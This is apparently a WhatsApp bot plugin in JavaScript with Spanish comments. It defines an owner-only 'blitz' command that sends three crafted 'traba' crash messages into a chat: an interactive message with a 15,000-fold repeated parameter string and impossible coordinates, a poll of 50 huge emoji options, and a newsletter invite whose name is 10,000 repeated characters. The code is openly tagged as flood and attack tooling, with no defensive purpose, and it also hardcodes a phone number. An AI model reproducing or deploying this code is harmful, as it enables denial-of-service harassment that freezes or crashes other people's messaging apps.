let handler = async (m, { conn }) => {
    const ownerNumber = '527447800928@s.whatsapp.net';
    const botNumber = conn.user?.jid || '';
    const sender = m.sender;

    if (sender !== ownerNumber && sender !== botNumber) {
        return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el número del bot.', m);
    }

    const target = m.chat;

    // Enviar 3 trabas seguidas con diferentes tipos
    await BlitzrForce(target, conn);           // nativeFlow
    await delay(1500);
    await PollTraba(target, conn);             // poll
    await delay(1500);
    await NewsletterTraba(target, conn);       // newsletter

    await conn.sendMessage(m.chat, { text: `🔥 Traba múltiple enviada.` }, { quoted: m });
};

// NativeFlow traba pesada
async function BlitzrForce(target, sock) {
    try {
        let message = {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "© KayzX",
                            hasMediaAttachment: false,
                            locationMessage: {
                                degreesLatitude: -999.0349,
                                degreesLongitude: 922.9999,
                                name: "© KayzX",
                                address: "© KayzX",
                            },
                        },
                        body: {
                            text: "© KayzX",
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}".repeat(15000), // Muy pesada
                        },
                        contextInfo: {
                            participant: "0@s.whatsapp.net",
                            mentionedJid: ["0@s.whatsapp.net"],
                        },
                    },
                },
            },
        };

        await sock.relayMessage(target, message, {
            messageId: null,
            participant: { jid: target },
            userJid: target,
        });
    } catch (err) {
        console.error('Error nativeFlow:', err);
    }
}

// Poll traba
async function PollTraba(target, sock) {
    try {
        const options = Array(50).fill("💣".repeat(500)); // 50 opciones, cada una con spam
        let message = {
            pollCreationMessage: {
                name: "💥 Ataque Poll 💥",
                options: options.map(option => ({ optionName: option })),
                selectableOptionsCount: 1
            }
        };

        await sock.relayMessage(target, message, { messageId: null });
    } catch (err) {
        console.error('Error poll:', err);
    }
}

// Newsletter traba
async function NewsletterTraba(target, sock) {
    try {
        const travas = '꧁'.repeat(10000);
        let message = {
            newsletterAdminInviteMessage: {
                newsletterJid: "120363282786345717@newsletter",
                newsletterName: "⚠️" + travas,
                jpegThumbnail: Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAUA', 'base64'), // base64 dummy
                caption: "𝗧𝗿𝗮𝗯𝗮 𝗯𝘆 𝗞𝗮𝘆𝘇𝗫 💀",
                inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
            }
        };

        await sock.relayMessage(target, message, { messageId: null });
    } catch (err) {
        console.error('Error newsletter:', err);
    }
}

// Delay entre mensajes
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

handler.command = ['blitz'];
handler.tags = ['traba', 'flood', 'ataque'];
handler.help = ['blitz'];

export default handler;